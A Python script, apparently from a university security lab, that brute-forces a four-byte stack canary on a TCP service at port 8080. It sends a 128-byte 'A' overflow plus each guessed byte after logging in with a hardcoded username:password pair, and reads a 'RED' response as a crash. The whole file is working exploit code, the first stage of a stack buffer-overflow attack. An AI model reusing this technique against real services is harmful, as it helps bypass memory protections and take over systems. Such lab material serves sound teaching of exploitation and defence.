#!/usr/bin/python
import socket
import time


def checkResponse(res):
    time.sleep(0.5)
    badRes = 'RED'
    if badRes in res:
        return 0
    else:
        return 1


def getCanary(buffer):
    for element in range(256):

        IP_FH = '10.105.21.174'
        IP_MARTIN = '10.0.2.22'
        IP = IP_FH
        PORT = 8080
        BUFFE_SIZE = 4096

        login = 'cs19m050:cs19m050' + '\n'
        exit = 'e' + '\n'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        connect = s.connect((IP, PORT))  # hardcoded IP address
        res1 = s.recv(BUFFE_SIZE)

        # login with username
        s.send(login)
        res3 = s.recv(BUFFE_SIZE)

        s.send(buffer + chr(element) + '\n')
        res4_1 = s.recv(BUFFE_SIZE)
        s.send(exit)
        res5 = s.recv(BUFFE_SIZE)
        res6 = s.recv(BUFFE_SIZE)
        print(res5)
        print(res6)
        result = checkResponse(res5 + res6)

        if result == 1:
            canary1 = element
            print('Canary = ' + str(canary1) + ' - ' + hex(canary1))
            return element
            break
        else:
            print('Canary is not ' + str(element) + ' - ' + hex(element))

        s.close()


def main():
    canary1 = 'a'
    canary2 = 'a'
    canary3 = 'a'
    canary4 = 'a'

    #buffer = 'u ' + 'A' * 128 + chr(element) + '\n'
    buffer = 'u ' + 'A' * 128
    canary1 = getCanary(buffer)
    buffer = buffer + chr(canary1)
    canary2 = getCanary(buffer)
    buffer = buffer + chr(canary2)
    canary3 = getCanary(buffer)
    buffer = buffer + chr(canary3)
    canary4 = getCanary(buffer)

    print('Successfully got canaries:')
    print('--------------------------')
    print('canary1: ' + hex(canary1))
    print('canary2: ' + hex(canary2))
    print('canary3: ' + hex(canary3))
    print('canary4: ' + hex(canary4))
    print('--------------------------')

main()
